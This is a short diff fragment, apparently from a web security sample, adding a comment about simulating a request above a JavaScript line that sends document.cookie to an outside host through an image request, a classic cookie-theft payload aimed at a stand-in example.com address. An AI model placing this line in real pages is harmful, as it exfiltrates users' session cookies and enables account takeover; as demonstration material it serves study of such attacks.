@@ -1,3 +1,4 @@
+<!--Here, I would write a sample js to simulate request-->
 <!--GET-->
 new Image().src = "http://www.example.com/"+escape(document.cookie);
 
